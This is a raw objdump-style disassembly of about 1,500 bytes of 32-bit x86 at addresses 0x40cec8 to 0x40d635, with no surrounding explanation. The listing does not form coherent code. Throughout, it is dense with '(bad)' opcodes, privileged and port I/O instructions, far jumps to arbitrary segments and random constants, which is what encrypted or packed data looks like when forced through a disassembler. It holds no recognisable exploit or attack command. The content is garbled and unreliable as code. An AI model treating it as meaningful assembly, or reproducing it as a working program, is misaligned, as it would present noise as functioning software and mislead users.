  40cec8:	(bad)  
  40cec9:	enter  0x70de,0xc5
  40cecd:	cld    
  40cece:	cld    
  40cecf:	mov    bl,0x4a
  40ced1:	lods   al,BYTE PTR ds:[esi]
  40ced3:	push   cs
  40ced4:	ins    BYTE PTR es:[edi],dx
  40ced5:	popf   
  40ced6:	pop    ebx
  40ced7:	ret    
  40ced8:	scas   eax,DWORD PTR es:[edi]
  40ced9:	daa    
  40ceda:	dec    ecx
  40cedb:	lock push esp
  40cedd:	xlat   BYTE PTR cs:[ebx]
  40cedf:	push   0xffffffbc
  40cee1:	sbb    bh,dh
  40cee3:	sbb    DWORD PTR [ecx+0x406cee89],0xfffffff4
  40ceea:	scas   al,BYTE PTR es:[edi]
  40ceeb:	xchg   esp,eax
  40ceec:	imul   ecx,DWORD PTR [eax+0x55],0x252c9b8c
  40cef3:	scas   eax,DWORD PTR es:[edi]
  40cef4:	mov    eax,ds:0x7dc0ba4e
  40cef9:	xchg   esi,eax
  40cefa:	sbb    eax,0x4ebc4c3c
  40ceff:	es jge 0x40cf49
  40cf02:	ret    
  40cf03:	clc    
  40cf04:	sub    bh,ah
  40cf06:	inc    esi
  40cf07:	ficom  DWORD PTR [eax+ecx*8+0x7d]
  40cf0b:	dec    esi
  40cf0c:	sahf   
  40cf0d:	ret    0x1546
  40cf10:	mov    esi,0x6844cefb
  40cf15:	inc    esp
  40cf16:	mov    edx,?
  40cf18:	inc    ebx
  40cf19:	pushf  
  40cf1a:	out    0xc5,al
  40cf1c:	push   edx
  40cf1d:	cmp    esi,eax
  40cf1f:	mov    ecx,0xd16c437c
  40cf24:	cmp    dl,al
  40cf26:	cdq    
  40cf27:	push   edx
  40cf28:	add    DWORD PTR [edx+0x27],0x32
  40cf2c:	and    ah,BYTE PTR [edx+0x390727d6]
  40cf32:	out    dx,eax
  40cf33:	sbb    eax,0xc67f48ea
  40cf38:	cli    
  40cf39:	or     eax,0xb8559b27
  40cf3e:	xchg   ecx,eax
  40cf3f:	add    eax,0x2f
  40cf42:	loopne 0x40cfa9
  40cf44:	je     0x40cf4b
  40cf46:	ret    0x299f
  40cf49:	sbb    esp,DWORD PTR [ebx+0x2e]
  40cf4c:	xor    ch,BYTE PTR [ebx-0x6ba7c967]
  40cf52:	push   0xa09b68b9
  40cf57:	push   0x472999ca
  40cf5c:	jge    0x40cfa5
  40cf5e:	push   ebx
  40cf5f:	int3   
  40cf60:	(bad)  
  40cf61:	jns    0x40cf77
  40cf63:	and    BYTE PTR [ebx-0x41d8088c],dl
  40cf69:	mov    al,0x52
  40cf6b:	xor    edi,ebx
  40cf6d:	dec    ebx
  40cf6e:	jmp    0x58d8:0x350180f3
  40cf75:	stos   BYTE PTR es:[edi],al
  40cf76:	dec    edi
  40cf77:	fwait
  40cf78:	cmc    
  40cf79:	sbb    DWORD PTR [ebx-0x49],0xfffffff1
  40cf7d:	add    cl,BYTE PTR [ebx]
  40cf7f:	pop    ecx
  40cf80:	je     0x40cf33
  40cf82:	adc    DWORD PTR [ecx-0x7f],edx
  40cf85:	xor    cl,BYTE PTR [eax]
  40cf87:	int    0x5b
  40cf89:	nop
  40cf8a:	cmp    edi,ebp
  40cf8c:	ret    0x8344
  40cf8f:	into   
  40cf90:	retf   
  40cf91:	adc    eax,0xac04fb08
  40cf96:	loop   0x40cfa9
  40cf98:	sar    BYTE PTR [ecx+0x79],0x63
  40cf9c:	jno    0x40cff8
  40cf9e:	leave  
  40cf9f:	jle    0x92105e7c
  40cfa5:	mov    ds:0x786f7d4f,eax
  40cfaa:	adc    al,0x58
  40cfac:	or     al,0xdd
  40cfae:	ffree  st(7)
  40cfb0:	mov    esp,0x87b0dae0
  40cfb5:	mov    ss,WORD PTR fs:[esi+ecx*2-0x71]
  40cfba:	add    DWORD PTR [ebp+0x518305b],edx
  40cfc0:	ret    0x8eb2
  40cfc3:	mov    ch,0x45
  40cfc5:	add    eax,0xcd177127
  40cfca:	mov    ah,0x54
  40cfcc:	push   ds
  40cfcd:	call   0x692e:0x6262044e
  40cfd4:	in     al,0x7
  40cfd6:	push   esp
  40cfd7:	(bad)  
  40cfd9:	jecxz  0x40d020
  40cfdb:	and    BYTE PTR [edi+ebx*8-0x25],ch
  40cfdf:	pop    esi
  40cfe0:	je     0x40cf8d
  40cfe2:	js     0x40cffb
  40cfe4:	sub    DWORD PTR [ebx],esp
  40cfe6:	mov    ds:0x37ccea03,eax
  40cfeb:	aad    0x4e
  40cfed:	pop    esi
  40cfee:	xchg   edi,eax
  40cfef:	inc    ecx
  40cff0:	jl     0x40d04e
  40cff2:	mov    esp,?
  40cff4:	hlt    
  40cff5:	lock jmp 0xbb94:0xc36baa05
  40cffd:	in     eax,dx
  40cffe:	sbb    esp,DWORD PTR [ecx-0x724fbbf9]
  40d004:	hlt    
  40d005:	jo     0x40d072
  40d007:	in     eax,0x4
  40d009:	mov    esp,0x9ef7ad79
  40d00e:	ja     0x40d07b
  40d010:	jle    0x40d074
  40d012:	std    
  40d013:	(bad)  ss:[eax-0x496bd2ed]
  40d01a:	xlat   BYTE PTR ds:[ebx]
  40d01c:	fnsave [ecx+0x24]
  40d01f:	pop    ebx
  40d020:	pop    esp
  40d021:	lods   eax,DWORD PTR ds:[esi]
  40d022:	pop    ds
  40d023:	push   es
  40d024:	sbb    edx,edi
  40d026:	pop    edx
  40d027:	push   eax
  40d028:	adc    eax,0x87d9c5bf
  40d02d:	xor    BYTE PTR [eax+0x46],0xff
  40d031:	push   ebx
  40d032:	add    al,0xb4
  40d034:	retf   
  40d035:	stc    
  40d036:	add    al,0x9b
  40d038:	(bad)  
  40d039:	sbb    al,0x72
  40d03b:	and    bl,dl
  40d03d:	sub    eax,0x877f4455
  40d042:	pop    esi
  40d043:	jp     0x40d03b
  40d045:	add    DWORD PTR [edi-0x8],esp
  40d048:	inc    ebx
  40d049:	fild   QWORD PTR [ebx-0x1b]
  40d04c:	mov    ax,0xe3d8
  40d050:	mov    ds,WORD PTR [esi-0xc470d4c]
  40d056:	in     eax,0x74
  40d058:	push   ebp
  40d059:	test   ch,al
  40d05b:	fdiv   st(5),st
  40d05d:	mov    dh,BYTE PTR [ebp-0x10]
  40d060:	mov    ebx,ds
  40d062:	call   0xadfe2ee1
  40d067:	sub    eax,0xee703c84
  40d06c:	cmp    eax,0x7137cd9a
  40d071:	popa   
  40d072:	mov    ds:0xa67727d0,eax
  40d077:	adc    BYTE PTR [edx],bh
  40d079:	mov    al,ds:0x7339548
  40d07e:	sbb    dh,cl
  40d080:	adc    eax,0xbee8a9bd
  40d085:	push   0xfffffffc
  40d087:	push   es
  40d088:	sub    edx,0x4622e326
  40d08e:	sub    dh,dl
  40d090:	mov    bl,0x58
  40d092:	pop    ss
  40d093:	(bad)  
  40d094:	dec    esp
  40d095:	jnp    0x40d0ad
  40d097:	and    ecx,DWORD PTR [ebp+0x48137717]
  40d09d:	ss mov edx,0x787931f1
  40d0a3:	inc    esi
  40d0a4:	cmp    eax,DWORD PTR [edx]
  40d0a6:	and    DWORD PTR fs:[esi-0x24],0x7d
  40d0ab:	repz pop ss
  40d0ad:	popa   
  40d0ae:	(bad)  
  40d0af:	xor    eax,DWORD PTR [eax+0x4f]
  40d0b2:	(bad)  
  40d0b3:	ja     0x40d066
  40d0b5:	or     dl,BYTE PTR [ebx+0xb]
  40d0b8:	loopne 0x40d0f4
  40d0ba:	adc    al,0x13
  40d0bc:	cwde   
  40d0bd:	outs   dx,DWORD PTR ds:[esi]
  40d0be:	inc    dx
  40d0c0:	and    dh,bl
  40d0c2:	jle    0x40d070
  40d0c4:	out    dx,eax
  40d0c5:	fs (bad) 
  40d0c7:	(bad)  
  40d0c8:	pop    esi
  40d0c9:	dec    esi
  40d0ca:	loop   0x40d088
  40d0cc:	mov    esp,0xc3d56e8
  40d0d1:	dec    ebp
  40d0d2:	jno    0x40d0b2
  40d0d4:	scas   al,BYTE PTR es:[edi]
  40d0d5:	pop    esi
  40d0d6:	mov    dl,0xac
  40d0d8:	(bad)  
  40d0d9:	aaa    
  40d0da:	xchg   ebp,eax
  40d0db:	inc    eax
  40d0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0dd:	mov    dl,0x12
  40d0df:	and    BYTE PTR [esi-0x5a24cc4e],0x44
  40d0e6:	bound  esi,QWORD PTR [ecx+eax*8]
  40d0e9:	pop    edx
  40d0ea:	mov    esi,0x66c89a9
  40d0ef:	mov    bh,0xc0
  40d0f1:	add    edx,DWORD PTR [eax]
  40d0f3:	lahf   
  40d0f4:	cmp    ch,BYTE PTR [ecx+0x3bfde038]
  40d0fa:	scas   eax,DWORD PTR es:[edi]
  40d0fb:	jle    0x40d0e2
  40d0fd:	loopne 0x40d0c3
  40d0ff:	in     al,dx
  40d100:	dec    esi
  40d101:	push   cs
  40d102:	jmp    0x46475efe
  40d107:	pop    ebp
  40d108:	stc    
  40d109:	fxch   st(4)
  40d10b:	jns    0x40d0e2
  40d10d:	cdq    
  40d10e:	pop    ecx
  40d10f:	pop    esp
  40d110:	jecxz  0x40d170
  40d112:	test   BYTE PTR [ebp+0x787f5e6a],cl
  40d118:	jmp    0x378b:0x86346018
  40d11f:	les    ebp,FWORD PTR [ebp-0x1d]
  40d122:	ins    DWORD PTR es:[edi],dx
  40d123:	pushf  
  40d124:	loop   0x40d17b
  40d126:	mov    edi,0x11668695
  40d12b:	xchg   bh,dh
  40d12d:	hlt    
  40d12e:	mov    al,dh
  40d130:	adc    al,0xd7
  40d132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d133:	sbb    cl,BYTE PTR [esi+0x65]
  40d136:	pop    esp
  40d137:	and    ah,BYTE PTR [ecx-0x7831845b]
  40d13d:	mov    ds:0xa963b67a,eax
  40d142:	and    bl,BYTE PTR [ecx+0x45]
  40d145:	lea    ebp,[eax-0x65]
  40d148:	xor    BYTE PTR [ecx],al
  40d14a:	std    
  40d14b:	cli    
  40d14c:	shl    DWORD PTR [eax-0xe],cl
  40d14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d150:	mov    ah,0x92
  40d152:	add    esi,DWORD PTR [edx]
  40d154:	pop    eax
  40d155:	adc    al,dh
  40d157:	sub    DWORD PTR [di],esi
  40d15a:	mov    bl,cl
  40d15c:	retf   0x3bd9
  40d15f:	jnp    0x40d150
  40d161:	push   esi
  40d162:	pop    esi
  40d163:	or     esp,ebp
  40d165:	adc    al,0xf6
  40d167:	cmp    bh,ah
  40d169:	in     eax,dx
  40d16a:	aam    0xe6
  40d16c:	jmp    0xab4ecd35
  40d171:	mul    BYTE PTR [edi+0x69]
  40d174:	dec    edx
  40d175:	iret   
  40d176:	ficomp WORD PTR [edi-0x69cca2f]
  40d17c:	sub    edx,DWORD PTR [edi]
  40d17e:	lds    ecx,FWORD PTR [esi-0x691ed73a]
  40d184:	jns    0x40d1b2
  40d186:	pushf  
  40d187:	and    ebp,0xffffffb8
  40d18a:	jo     0x40d1a8
  40d18c:	ins    DWORD PTR es:[edi],dx
  40d18d:	bound  edi,QWORD PTR [ebx+edi*4+0x18]
  40d191:	scas   al,BYTE PTR es:[edi]
  40d192:	std    
  40d193:	clc    
  40d194:	push   0x9e073932
  40d199:	shl    DWORD PTR [edi],cl
  40d19b:	sub    eax,0x4611d5dc
  40d1a0:	(bad)  
  40d1a2:	sbb    DWORD PTR [edx+0x51380760],0x47c49e1d
  40d1ac:	cld    
  40d1ad:	xlat   BYTE PTR ds:[ebx]
  40d1ae:	mov    ?,WORD PTR es:[eax]
  40d1b1:	test   al,0x58
  40d1b3:	or     DWORD PTR [edi-0x1d],ebp
  40d1b6:	fs out 0xf1,al
  40d1b9:	ret    0x373d
  40d1bc:	cdq    
  40d1bd:	stos   BYTE PTR es:[edi],al
  40d1be:	ror    BYTE PTR [ebp-0x60448d9c],1
  40d1c4:	std    
  40d1c5:	aam    0xe2
  40d1c7:	imul   edx,DWORD PTR [eax+0x46],0xffffffff
  40d1cb:	and    BYTE PTR [ebx+0x18],0x78
  40d1cf:	mov    eax,ds:0xee3d473f
  40d1d4:	xchg   ah,dl
  40d1d6:	xor    DWORD PTR [eax+0x68],ebx
  40d1d9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1db:	or     BYTE PTR [esi+0x66],0x71
  40d1df:	ja     0x40d1ae
  40d1e1:	inc    edi
  40d1e2:	popa   
  40d1e3:	repz cmp al,0xe9
  40d1e6:	sub    bh,dl
  40d1e8:	pop    ecx
  40d1e9:	mov    eax,ds:0x347ebf18
  40d1ee:	mov    WORD PTR [edi-0x1c7e3de8],ss
  40d1f4:	xchg   edi,eax
  40d1f5:	loopne 0x40d1f6
  40d1f7:	lock xor al,0x1d
  40d1fa:	pop    edx
  40d1fb:	inc    esp
  40d1fc:	jbe    0x40d235
  40d1fe:	icebp  
  40d1ff:	(bad)  
  40d200:	xor    bl,BYTE PTR [edi+0x1bb06aa8]
  40d206:	fcmovne st,st(7)
  40d208:	and    eax,0x614324d0
  40d20d:	add    bl,dl
  40d20f:	sub    eax,0x9618edbc
  40d214:	cmp    dh,BYTE PTR [eax]
  40d216:	fld    QWORD PTR [ebx+edx*8]
  40d219:	sub    eax,0x9cb2066d
  40d21e:	sbb    DWORD PTR [esi+edi*8+0x162d54cf],esp
  40d225:	add    bl,dl
  40d227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d228:	je     0x40d1e2
  40d22a:	and    dl,BYTE PTR [ebp+0x308a3f55]
  40d230:	arpl   WORD PTR [edi],bp
  40d232:	hlt    
  40d233:	mov    al,ds:0xc801fa9b
  40d238:	pop    esp
  40d239:	sar    ebp,1
  40d23b:	inc    esi
  40d23c:	mov    eax,0x7f85856e
  40d241:	inc    esp
  40d242:	lds    edi,FWORD PTR ds:0xa4f44cd3
  40d248:	mov    esi,0x880f6223
  40d24d:	and    BYTE PTR [ebx-0x76fef3ec],ah
  40d253:	pop    eax
  40d254:	daa    
  40d255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d256:	inc    edx
  40d257:	pop    esp
  40d258:	retf   0xd636
  40d25b:	data16 not BYTE PTR [edx+0x7f]
  40d25f:	pop    ebx
  40d260:	outs   dx,DWORD PTR ds:[esi]
  40d261:	repnz xor edi,DWORD PTR [ebx]
  40d264:	lods   eax,DWORD PTR ds:[esi]
  40d265:	cmp    cl,BYTE PTR [esp+ecx*1-0x7c]
  40d269:	push   es
  40d26a:	jle    0x40d25d
  40d26c:	cdq    
  40d26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d26e:	loop   0x40d238
  40d270:	imul   ebx,DWORD PTR [edi],0x436aa043
  40d276:	pusha  
  40d277:	rcl    ebp,cl
  40d279:	cdq    
  40d27a:	je     0x40d260
  40d27c:	lea    eax,[ebp-0x66]
  40d27f:	cdq    
  40d280:	sbb    al,0x37
  40d282:	push   esp
  40d283:	inc    ebx
  40d284:	outs   dx,BYTE PTR ds:[esi]
  40d285:	jne    0x40d2e3
  40d287:	test   BYTE PTR [edx+0x7f],cl
  40d28a:	xor    BYTE PTR [esi],dl
  40d28c:	mov    ah,0x5c
  40d28e:	sahf   
  40d28f:	(bad)  [eax-0x48]
  40d292:	push   eax
  40d293:	sub    ebp,DWORD PTR [edi+0x54d1b0bd]
  40d299:	and    eax,0x6d46e988
  40d29e:	ins    DWORD PTR es:[edi],dx
  40d29f:	cmc    
  40d2a0:	or     al,0xf0
  40d2a2:	in     eax,dx
  40d2a3:	fisttp QWORD PTR [ebx]
  40d2a5:	ja     0x40d231
  40d2a7:	loop   0x40d268
  40d2a9:	mov    cs,WORD PTR [edi]
  40d2ab:	inc    esp
  40d2ac:	inc    edx
  40d2ad:	push   edx
  40d2ae:	dec    esp
  40d2af:	nop
  40d2b0:	mov    ebp,0x3a27ed7d
  40d2b5:	push   eax
  40d2b6:	imul   ebx,DWORD PTR [ebp-0x11d151f1],0xb9be28fe
  40d2c0:	lock mov DWORD PTR [ecx+0x5a],ebp
  40d2c4:	into   
  40d2c5:	pop    eax
  40d2c6:	test   al,0x6d
  40d2c8:	cmp    edi,eax
  40d2ca:	pop    ss
  40d2cb:	pop    ds
  40d2cc:	mov    ecx,0x68314bb1
  40d2d1:	dec    ebx
  40d2d2:	je     0x40d2b0
  40d2d4:	(bad)  
  40d2d6:	jp     0x40d344
  40d2d8:	pop    ss
  40d2d9:	xchg   edi,eax
  40d2da:	push   eax
  40d2db:	daa    
  40d2dc:	mov    ds:0x76cb696d,eax
  40d2e1:	loope  0x40d314
  40d2e3:	sub    al,0x8
  40d2e5:	int    0xa8
  40d2e7:	sub    BYTE PTR [ebx],al
  40d2e9:	ss cli 
  40d2eb:	dec    ebx
  40d2ec:	add    esi,DWORD PTR [ecx-0x45]
  40d2ef:	xor    DWORD PTR [ecx+0x3d],ebx
  40d2f2:	scas   eax,DWORD PTR es:[edi]
  40d2f3:	ret    0x8e66
  40d2f6:	ror    DWORD PTR [esi],0xa5
  40d2f9:	xchg   BYTE PTR [edi+0x7b49dc6d],dh
  40d2ff:	inc    edi
  40d300:	(bad)  
  40d301:	pop    esp
  40d302:	mov    BYTE PTR ds:0x42b9487b,dh
  40d308:	(bad)  
  40d309:	or     al,0xe5
  40d30b:	out    0xfa,al
  40d30d:	shl    ah,1
  40d30f:	xor    edi,ebp
  40d311:	add    ebp,DWORD PTR [edi+0x3b]
  40d314:	dec    esi
  40d315:	lea    ebp,[ebx]
  40d317:	jnp    0x40d366
  40d319:	je     0x40d2eb
  40d31b:	popf   
  40d31c:	mov    eax,ds:0xa4f01f5a
  40d321:	xchg   edi,eax
  40d322:	das    
  40d323:	push   cs
  40d324:	cmp    ch,BYTE PTR [esi]
  40d326:	sbb    eax,0x71316a00
  40d32b:	es mov edi,0xe747b31f
  40d331:	nop
  40d332:	cmp    BYTE PTR [ebx+0x283efc38],bh
  40d338:	in     al,dx
  40d339:	mov    ch,ah
  40d33b:	cmp    al,0x3f
  40d33d:	mov    al,ds:0xcc0c0369
  40d342:	sub    BYTE PTR [esp+eax*8-0x5],bh
  40d346:	div    DWORD PTR [ebx]
  40d348:	pop    ds
  40d349:	adc    dl,al
  40d34b:	in     eax,0xd
  40d34d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d34e:	scas   al,BYTE PTR es:[edi]
  40d34f:	adc    al,ch
  40d351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d352:	mov    es,edi
  40d354:	cs pusha 
  40d356:	inc    ecx
  40d357:	leave  
  40d358:	push   ebp
  40d359:	mov    eax,ds:0xa20082bd
  40d35e:	(bad)  [edi-0x56624c2d]
  40d364:	xor    al,0x35
  40d366:	mov    esi,0x6d3110e0
  40d36b:	or     esp,DWORD PTR [ebx-0x7d]
  40d36e:	dec    esi
  40d36f:	repz pusha 
  40d371:	repnz mul BYTE PTR [ebp+0x5780a84b]
  40d378:	xchg   edi,eax
  40d379:	test   al,bl
  40d37b:	aas    
  40d37c:	popf   
  40d37d:	retf   
  40d37e:	sub    eax,0x6e5aab39
  40d383:	into   
  40d384:	add    esp,eax
  40d386:	adc    eax,esp
  40d388:	xor    al,BYTE PTR [esp+edi*2-0x3a5aec6d]
  40d38f:	outs   dx,BYTE PTR ds:[esi]
  40d390:	mov    bh,0x12
  40d392:	add    BYTE PTR [edi+0x1e],ch
  40d395:	cli    
  40d396:	pop    ebp
  40d397:	mov    ds:0xd75aa8f0,al
  40d39c:	dec    edx
  40d39d:	push   eax
  40d39e:	lds    ecx,FWORD PTR [edx-0x5d19637d]
  40d3a4:	mov    esi,0xf8efb87f
  40d3a9:	dec    esp
  40d3aa:	fist   WORD PTR [ebx+eax*4-0x7f41252e]
  40d3b1:	sbb    eax,0x825084cb
  40d3b6:	mov    dh,BYTE PTR [ebp+0x1ec6ff86]
  40d3bc:	inc    eax
  40d3bd:	mov    bh,0x1e
  40d3bf:	mov    esp,0x5462bd03
  40d3c4:	fwait
  40d3c5:	pop    eax
  40d3c6:	stc    
  40d3c7:	shl    DWORD PTR [ebp+0x13],1
  40d3ca:	mov    ebp,0xbfed6d4c
  40d3cf:	repz mov ah,0x1
  40d3d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3d3:	and    ebx,edx
  40d3d5:	cmp    ebp,DWORD PTR [esi-0x5bf9fde5]
  40d3db:	retf   0xb277
  40d3de:	mov    ecx,0xfde703a3
  40d3e3:	adc    ah,ah
  40d3e5:	cmp    DWORD PTR ds:0xb2f8f764,ebx
  40d3eb:	sbb    al,0x82
  40d3ed:	add    BYTE PTR [edi-0x154dbf56],ah
  40d3f3:	add    ch,BYTE PTR ds:0x6040ddc6
  40d3f9:	sub    esi,DWORD PTR [esi]
  40d3fb:	les    edx,FWORD PTR [ecx-0x53]
  40d3fe:	adc    al,0xcb
  40d400:	push   ebx
  40d401:	add    BYTE PTR [ebx-0x13bafa63],0x49
  40d408:	add    DWORD PTR [edx+edx*8+0x65],ebx
  40d40c:	fist   WORD PTR [ecx-0x66c34067]
  40d412:	xchg   ebx,eax
  40d413:	repz loop 0x40d3ad
  40d416:	ins    DWORD PTR es:[edi],dx
  40d417:	inc    ebp
  40d418:	in     eax,dx
  40d419:	adc    DWORD PTR [ebp+0x32751ec1],edi
  40d41f:	mov    al,0x79
  40d421:	push   eax
  40d422:	arpl   WORD PTR [ebp-0x5b],si
  40d425:	stc    
  40d426:	add    cl,BYTE PTR [eax+0x3c99612a]
  40d42c:	call   0x6c3ab32c
  40d431:	jno    0x40d456
  40d433:	out    0x39,al
  40d435:	pop    ss
  40d436:	fwait
  40d437:	std    
  40d438:	jmp    0x3e992bd1
  40d43d:	and    al,0xb4
  40d43f:	jle    0x40d456
  40d441:	dec    ebp
  40d442:	jg     0x40d3d4
  40d444:	dec    ebx
  40d445:	enter  0x764e,0xd4
  40d449:	adc    ebp,esi
  40d44b:	mov    dh,0x1d
  40d44d:	pop    ebp
  40d44e:	mov    ebp,DWORD PTR [edx-0x1e]
  40d451:	cmp    eax,0x58a45def
  40d456:	inc    ecx
  40d457:	cmc    
  40d458:	add    eax,0x1349d75b
  40d45d:	lods   eax,DWORD PTR ds:[esi]
  40d45e:	jnp    0x40d41b
  40d460:	pop    edi
  40d461:	inc    BYTE PTR [ecx+0x33]
  40d464:	mov    ds:0xde72aa00,eax
  40d469:	mov    eax,ds:0xe45d7cab
  40d46e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d46f:	dec    esi
  40d470:	test   DWORD PTR [edx+0x45b3e87e],0x2f73e34
  40d47a:	rsm    
  40d47c:	sbb    ebx,DWORD PTR [ebp-0x44]
  40d47f:	das    
  40d480:	add    DWORD PTR [ebx-0x46d4ee5b],ebx
  40d486:	and    al,0xc
  40d488:	rcl    DWORD PTR [eax-0x1b8e0ffd],cl
  40d48e:	cld    
  40d48f:	adc    eax,0x7af71d3e
  40d494:	fimul  DWORD PTR [ecx-0x2545a10]
  40d49a:	dec    esp
  40d49b:	adc    DWORD PTR [edi+0x5f],eax
  40d49e:	into   
  40d49f:	xchg   BYTE PTR [eax-0x22f3cb4e],bl
  40d4a5:	dec    eax
  40d4a6:	daa    
  40d4a7:	data16 outs dx,BYTE PTR ds:[esi]
  40d4a9:	out    0xef,al
  40d4ab:	out    0xf9,eax
  40d4ad:	adc    eax,0x63da7fdb
  40d4b2:	out    0x4b,eax
  40d4b4:	xchg   ebp,eax
  40d4b5:	xchg   esi,eax
  40d4b6:	add    DWORD PTR [esi+0x4bb9171d],0xca360f8b
  40d4c0:	pop    eax
  40d4c1:	jmp    0x1efc:0x1c854a88
  40d4c8:	or     DWORD PTR [ebx+0x75],ecx
  40d4cb:	pop    ecx
  40d4cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4cd:	data16 mov bl,0xa8
  40d4d0:	int3   
  40d4d1:	jg     0x40d512
  40d4d3:	into   
  40d4d4:	dec    edi
  40d4d5:	mov    dl,ah
  40d4d7:	into   
  40d4d8:	jae    0x40d4d8
  40d4da:	pop    esi
  40d4db:	xor    ebp,DWORD PTR [esi+0x5327a57b]
  40d4e1:	icebp  
  40d4e2:	pop    eax
  40d4e3:	push   es
  40d4e4:	xor    ah,BYTE PTR [edi+ebx*1-0x6effe4cb]
  40d4eb:	pushf  
  40d4ec:	dec    edx
  40d4ed:	mov    ch,0x98
  40d4ef:	mov    ebx,DWORD PTR [edi]
  40d4f1:	pop    ebx
  40d4f2:	(bad)  
  40d4f3:	fiadd  DWORD PTR [ebx+0x61]
  40d4f6:	fist   DWORD PTR [edi-0xa943f9c]
  40d4fc:	pusha  
  40d4fd:	xchg   DWORD PTR [edi-0x4739c480],edi
  40d503:	scas   eax,DWORD PTR es:[edi]
  40d504:	aaa    
  40d505:	imul   eax,DWORD PTR [edi-0x4cc5c677],0x4
  40d50c:	xchg   BYTE PTR [esi-0x5f995d4],al
  40d512:	ins    BYTE PTR es:[edi],dx
  40d513:	pop    edx
  40d514:	(bad)  
  40d516:	push   esp
  40d517:	enter  0x82a0,0x3e
  40d51b:	mov    WORD PTR [ebx-0x66],gs
  40d51e:	cdq    
  40d51f:	pop    esi
  40d520:	lds    eax,FWORD PTR [esi]
  40d522:	rcr    BYTE PTR ss:[ebx-0x43a4c49],cl
  40d529:	popa   
  40d52a:	xor    eax,0x5004c9f0
  40d52f:	sbb    BYTE PTR [edx],bl
  40d531:	jnp    0x40d55c
  40d533:	sbb    eax,0x4ef9ae57
  40d538:	xor    edx,DWORD PTR [ebx+ebp*4+0x21]
  40d53c:	int3   
  40d53d:	stos   DWORD PTR es:[edi],eax
  40d53e:	xlat   BYTE PTR ds:[ebx]
  40d53f:	jno    0x40d54e
  40d541:	push   0x9
  40d543:	out    0xcb,eax
  40d545:	mov    esi,0x248181df
  40d54a:	es js  0x40d594
  40d54d:	scas   eax,DWORD PTR es:[edi]
  40d54e:	inc    esp
  40d54f:	mov    ?,WORD PTR [eax+0x22]
  40d552:	jbe    0x40d53d
  40d554:	xchg   ebx,eax
  40d555:	int    0xf4
  40d557:	jo     0x40d5ba
  40d559:	js     0x40d56a
  40d55b:	sub    BYTE PTR [ebx+0x30223d37],dh
  40d561:	mov    ch,0xed
  40d563:	adc    al,0xa3
  40d565:	or     dl,bl
  40d567:	enter  0x58ae,0x77
  40d56b:	sbb    ecx,DWORD PTR [ebx-0x2f4428a]
  40d571:	sub    bh,BYTE PTR [ebx-0x77]
  40d574:	sub    ebx,DWORD PTR [ebp+ebp*8-0x68]
  40d578:	rcl    BYTE PTR [edi-0x7f757283],1
  40d57e:	loopne 0x40d502
  40d580:	mov    WORD PTR [ecx+0x5d],?
  40d583:	pop    ebp
  40d584:	xor    dl,dh
  40d586:	addr16 js 0x40d519
  40d589:	inc    edi
  40d58a:	sbb    eax,DWORD PTR [ebx+esi*1+0x2134e134]
  40d591:	retf   
  40d592:	in     eax,0xd
  40d594:	push   ebp
  40d595:	loop   0x40d583
  40d597:	push   ecx
  40d598:	daa    
  40d599:	test   BYTE PTR [ebx],cl
  40d59b:	or     al,0xf4
  40d59d:	pop    esi
  40d59e:	or     al,0xd0
  40d5a0:	inc    eax
  40d5a1:	popa   
  40d5a2:	adc    eax,0xf706852f
  40d5a7:	(bad)  
  40d5a8:	stc    
  40d5a9:	stos   BYTE PTR es:[edi],al
  40d5aa:	inc    esp
  40d5ab:	pop    edx
  40d5ac:	fnsave [edx+0xd]
  40d5af:	mov    edi,0x341c8636
  40d5b4:	ret    
  40d5b5:	in     al,dx
  40d5b6:	ficomp DWORD PTR [edi+0x7faaff4b]
  40d5bc:	adc    al,0xc7
  40d5be:	xor    al,0xbb
  40d5c0:	sti    
  40d5c1:	push   eax
  40d5c2:	minps  xmm5,xmm0
  40d5c5:	dec    ecx
  40d5c6:	dec    ecx
  40d5c7:	dec    esi
  40d5c8:	fisub  DWORD PTR ds:0x1e8fe25f
  40d5ce:	test   eax,0x2b52feb9
  40d5d3:	pop    esp
  40d5d4:	(bad)  
  40d5d5:	jns    0x40d599
  40d5d7:	dec    esi
  40d5d8:	imul   edx,DWORD PTR [ecx],0xffffffa2
  40d5db:	and    al,0xa
  40d5dd:	fcomp  DWORD PTR [edx-0x32]
  40d5e0:	add    eax,0x98225721
  40d5e5:	xlat   BYTE PTR ds:[ebx]
  40d5e6:	jns    0x40d589
  40d5e8:	dec    eax
  40d5e9:	pop    edi
  40d5ea:	cmp    ecx,eax
  40d5ec:	push   ebp
  40d5ed:	xchg   esp,eax
  40d5ee:	pushf  
  40d5ef:	sbb    BYTE PTR [edx],ah
  40d5f1:	xchg   BYTE PTR [esi+0xa6366f4],dl
  40d5f7:	xchg   esp,eax
  40d5f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5f9:	cmc    
  40d5fa:	add    BYTE PTR [edx],bh
  40d5fc:	push   es
  40d5fd:	sbb    edi,edi
  40d5ff:	stc    
  40d600:	sub    bh,BYTE PTR [esi-0x46]
  40d603:	push   ebp
  40d604:	cmp    ecx,DWORD PTR [ecx]
  40d606:	or     al,0xb8
  40d608:	jbe    0x40d5a4
  40d60a:	(bad)  
  40d60b:	jo     0x40d659
  40d60d:	cmp    esp,DWORD PTR [edi-0x20901220]
  40d613:	sbb    al,0x4f
  40d615:	add    eax,esp
  40d617:	sub    al,0xae
  40d619:	push   ss
  40d61a:	imul   cl
  40d61c:	fxch   st(0)
  40d61e:	test   eax,0x91481c6e
  40d623:	mov    ecx,0xf541cb57
  40d628:	daa    
  40d629:	test   eax,0x19ff2391
  40d62e:	add    BYTE PTR [esi+ebp*4+0x6f],ch
  40d632:	xchg   esp,eax
  40d633:	push   ecx
  40d634:	lahf   
  40d635:	mov    ?,esp
